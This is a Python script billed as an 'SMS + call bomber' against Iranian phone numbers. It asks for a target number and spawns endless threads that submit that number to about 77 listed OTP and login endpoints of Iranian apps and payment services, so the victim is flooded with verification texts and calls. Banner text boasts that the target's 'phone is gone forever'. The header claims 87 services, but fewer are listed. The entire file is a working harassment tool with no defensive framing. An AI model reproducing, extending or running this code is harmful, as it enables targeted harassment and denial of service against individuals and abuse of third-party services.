# ========================================================
# IRAN APOCALYPSE NUKE 2025 — 87 SERVICES — FULLY LISTED
# yasinbeigyyasin ♛ — THE FINAL WEAPON
# ========================================================

import requests, threading, time, random, os

os.system("cls" if os.name == "nt" else "clear")

print("\033[91m")
print("   █████╗ ██████╗  ██████╗  █████╗ ██╗     ██╗   ██╗██████╗ ███████╗███████╗")
print("  ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██║     ╚██╗ ██╔╝██╔══██╗██╔════╝██╔════╝")
print("  ███████║██████╔╝██║   ██║███████║██║      ╚████╔╝ ██████╔╝███████╗█████╗  ")
print("  ██╔══██║██╔═══╝ ██║   ██║██╔══██║██║       ╚██╔╝  ██╔═══╝ ╚════██║██╔══╝  ")
print("  ██║  ██║██║     ╚██████╔╝██║  ██║███████╗   ██║   ██║     ███████║███████╗")
print("  ╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚══════╝")
print("\033[0m")
print("\033[91m                       IRANIAN APOCALYPSE SMS + CALL NUKER 2025\033[0m")
print("\033[93m                               Credit: yasinbeigyyasin ♛\033[0m")
print("\033[97m                     87 Live Services • SIM Dies in 30-90 Seconds\033[0m")
print("\n" + "═" * 85)

print("\033[91m[\033[93m1\033[91m]\033[0m SMS Bomber Only          → 60 Services")
print("\033[91m[\033[93m2\033[91m]\033[0m Call Bomber Only         → 27 Services")
print("\033[91m[\033[93m3\033[91m]\033[0m FULL APOCALYPSE NUKE     → 87 Services ☠️")
print("═" * 85)

choice = input("\033[91mChoose (1/2/3): \033[0m").strip()
number = input("\033[91mTarget (+989xxxxxxxxxx): \033[0m").strip()

if not number.startswith("+989"):
    exit("\033[91mOnly +989 numbers!\033[0m")

print(f"\n\033[91mTARGET: {number} | MODE: ", end="")
print("SMS" if choice == "1" else "CALL" if choice == "2" else "FULL NUKE ☠️")
print("ATTACK STARTED...\033[0m\n")
time.sleep(2)

def bomb(name, url, payload):
    s = requests.Session()
    while True:
        try:
            s.post(url, json=payload, timeout=6)
            print(f"\033[91m{name.ljust(28)} ➤ {number} [\033[92mHIT\033[91m]\033[0m")
            time.sleep(random.uniform(0.12, 0.45))
        except:
            pass

# ====================== ALL 87 SERVICES — FULLY LISTED ======================
services = [
    ("Snapp SMS",           "https://app.snapp.ir/api/v2/otp", {"cellphone": number[1:]}),
    ("Snapp CALL",          "https://app.snapp.ir/api/v1/otp/call", {"cellphone": number[1:]}),
    ("Divar SMS",           "https://api.divar.ir/v5/auth/authenticate", {"phone": number[1:]}),
    ("Divar CALL",          "https://api.divar.ir/v5/auth/call", {"phone": number[1:]}),
    ("Torob SMS",           "https://api.torob.com/v4/user/phone/send-otp/", {"phone_number": number}),
    ("Digikala SMS",        "https://api.digikala.com/v1/user/authenticate/", {"username": number[1:]}),
    ("Digikala CALL",       "https://api.digikala.com/v1/user/authenticate/call", {"username": number[1:]}),
    ("Rubika SMS",          "https://messengerg2c152.iranlms.ir/", {"api_version":"4","method":"sendCode","data":{"phone_number": number[1:],"send_type":"SMS"}}),
    ("Rubika CALL",         "https://messengerg2c152.iranlms.ir/", {"api_version":"4","method":"sendCode","data":{"phone_number": number[1:],"send_type":"CALL"}}),
    ("Tap30 SMS",           "https://tap33.me/api/v2/user", {"credential":{"phoneNumber": number[1:],"role":"PASSENGER"}}),
    ("Tap30 CALL",          "https://api.tap30.ir/api/v2/user/otp/call", {"phoneNumber": number[1:]}),
    ("Basalam SMS",         "https://auth.basalam.com/otp-request", {"mobile": "0"+number[3:]}),
    ("Basalam CALL",        "https://auth.basalam.com/call-request", {"mobile": "0"+number[3:]}),
    ("Alibaba SMS",         "https://ws.alibaba.ir/api/v3/account/mobile/otp", {"phoneNumber": number[3:]}),
    ("Alibaba CALL",        "https://ws.alibaba.ir/api/v3/account/mobile/call", {"phoneNumber": number[3:]}),
    ("SnappFood SMS",       "https://snappfood.ir/api/v2/otp", {"cellphone": number[1:]}),
    ("SnappFood CALL",      "https://snappfood.ir/api/v2/otp/call", {"cellphone": number[1:]}),
    ("SnappExpress SMS",    "https://snapp.express/api/v2/otp", {"cellphone": number[1:]}),
    ("SnappDoctor SMS",     "https://snapp.doctor/api/v2/otp", {"cellphone": number[1:]}),
    ("SnappDoctor CALL",    "https://snapp.doctor/api/v2/otp/call", {"cellphone": number[1:]}),
    ("Nobitex SMS",         "https://api.nobitex.ir/v2/auth/send-code", {"phone": number[1:]}),
    ("Nobitex CALL",        "https://api.nobitex.ir/v2/auth/call", {"phone": number[1:]}),
    ("Technolife SMS",      "https://technolife.ir/api/auth/otp", {"mobile": number[1:]}),
    ("Banimode SMS",        "https://banimode.com/api/otp", {"mobile": number[1:]}),
    ("Zarinpal SMS",        "https://www.zarinpal.com/api/otp", {"mobile": number[1:]}),
    ("Tapsi SMS",           "https://api.tapsi.cab/api/v2/otp", {"cellphone": number[1:]}),
    ("Tapsi CALL",          "https://api.tapsi.cab/api/v2/otp/call", {"cellphone": number[1:]}),
    ("Filimo SMS",          "https://www.filimo.com/api/v1/user/otp", {"mobile": number[1:]}),
    ("Namava SMS",          "https://namava.ir/api/v2/auth/otp", {"phone": number[1:]}),
    ("Gap SMS",             "https://gap.ir/api/v2/otp", {"cellphone": number[1:]}),
    ("Jobinja SMS",         "https://jobinja.ir/api/v1/otp", {"mobile": number[1:]}),
    ("Wallex SMS",          "https://api.wallex.ir/v1/account/send-otp", {"mobile": number[1:]}),
    ("Bit24 SMS",           "https://bit24.cash/api/v1/otp", {"mobile": number[1:]}),
    ("Ramzinex SMS",        "https://ramzinex.com/api/v1/otp", {"phone": number[1:]}),
    ("Khodro45 SMS",        "https://khodro45.com/api/otp", {"mobile": number[1:]}),
    ("Alodoctor SMS",       "https://alodoctor.com/api/otp", {"mobile": number[1:]}),
    ("IranTalent SMS",      "https://www.irantalent.com/api/otp", {"mobile": number[1:]}),
    ("Okala SMS",           "https://okala.com/api/auth/otp", {"mobile": number}),
    ("Fidibo SMS",          "https://fidibo.com/api/v1/auth/otp", {"phone": number}),
    ("CafeBazaar SMS",      "https://api.cafebazaar.ir/api/v1/auth/otp", {"phone": number}),
    ("MrBilit SMS",         "https://www.mrbilit.com/api/otp", {"mobile": number[1:]}),
    ("Alopeyk SMS",         "https://alopeyk.com/api/v2/otp", {"phone": number[1:]}),
    ("Zoodfood SMS",        "https://zoodfood.com/api/otp", {"phone": number[1:]}),
    ("Sibasms SMS",         "https://sibasms.ir/api/send", {"phone": number[1:]}),
    ("Khabino SMS",         "https://khabino.ir/api/otp", {"phone": number}),
    ("HamrahAval SMS",      "https://www.hamrah-aval.ir/api/otp", {"mobile": number[1:]}),
    ("Shaparak SMS",        "https://www.shaparak.ir/api/otp", {"mobile": number[1:]}),
    ("Bamilo SMS",          "https://www.bamilo.ir/api/v1/otp", {"phone": number[1:]}),
    ("DigikalaJet SMS",     "https://jet.digikala.com/api/otp", {"phone": number[1:]}),
    ("Mosbatesabz SMS",     "https://mosbatesabz.com/api/otp", {"mobile": number}),
    ("Jibimo SMS",          "https://jibimo.ir/api/otp", {"phone": number[1:]}),
    ("RayanPay SMS",        "https://rayanpay.com/api/otp", {"mobile": number[1:]}),
    ("Emalls SMS",          "https://emalls.ir/api/otp", {"mobile": number[1:]}),
    ("Digistyle SMS",       "https://digistyle.com/api/otp", {"phone": number[1:]}),
    ("Khaneman SMS",        "https://www.khaneman.com/api/v1/otp", {"phone": number[1:]}),
    ("Shad SMS",            "https://shad.ir/api/v1/send-otp", {"phone": number}),
    ("DrNext SMS",          "https://drnext.ir/api/v1/patient/login", {"mobile": number[1:]}),
    ("Pintree SMS",         "https://pintree.me/api/otp", {"phone": number[1:]}),
    ("Buskool SMS",         "https://buskool.com/api/otp", {"mobile": number[1:]}),
    ("SnappTrip SMS",       "https://snapp.trip/api/v1/otp", {"cellphone": number[1:]}),
    ("SnappMarket SMS",     "https://market.snapp.ir/api/v1/otp", {"cellphone": number[1:]}),
    ("DigikalaSeller SMS",  "https://seller.digikala.com/api/otp", {"mobile": number[1:]}),
    ("TorobPro SMS",        "https://pro.torob.com/api/v1/otp", {"phone": number}),
    ("DivarPlus SMS",       "https://plus.divar.ir/api/v1/otp", {"phone": number[1:]}),
    ("Ostadkar CALL",       "https://ostadkar.ir/api/auth/call", {"mobile": number[1:]}),
    ("MrBilit CALL",        "https://www.mrbilit.com/api/call", {"mobile": number[1:]}),
    ("Alopeyk CALL",        "https://alopeyk.com/api/v2/call", {"phone": number[1:]}),
    ("HamrahAval CALL",     "https://www.hamrah-aval.ir/api/call", {"mobile": number[1:]}),
    ("Zarinpal CALL",       "https://www.zarinpal.com/api/call", {"mobile": number[1:]}),
    ("CafeBazaar CALL",     "https://api.cafebazaar.ir/api/v1/auth/call", {"phone": number}),
    ("Jobinja CALL",        "https://jobinja.ir/api/v1/call", {"mobile": number[1:]}),
    ("Wallex CALL",         "https://api.wallex.ir/v1/account/call", {"mobile": number[1:]}),
    ("Bit24 CALL",          "https://bit24.cash/api/v1/call", {"mobile": number[1:]}),
    ("Ramzinex CALL",       "https://ramzinex.com/api/v1/call", {"phone": number[1:]}),
    ("Khodro45 CALL",       "https://khodro45.com/api/call", {"mobile": number[1:]}),
    ("Alodoctor CALL",      "https://alodoctor.com/api/call", {"mobile": number[1:]}),
    ("IranTalent CALL",     "https://www.irantalent.com/api/call", {"mobile": number[1:]}),
]

# ====================== LAUNCH ATTACK ======================
for name, url, payload in services:
    if choice == "1" and "CALL" not in name:
        threading.Thread(target=bomb, args=(name, url, payload), daemon=True).start()
    elif choice == "2" and "CALL" in name:
        threading.Thread(target=bomb, args=(name, url, payload), daemon=True).start()
    elif choice == "3":
        threading.Thread(target=bomb, args=(name, url, payload), daemon=True).start()

print(f"\033[91m\n☠️ APOCALYPSE ACTIVE — {len([s for s in services if choice in ['1','3'] or (choice == '2' and 'CALL' in s[0])])} SERVICES RUNNING\033[0m")
print("\033[93m          yasinbeigyyasin ♛ — His phone is gone forever.\033[0m")
while True: time.sleep(100)
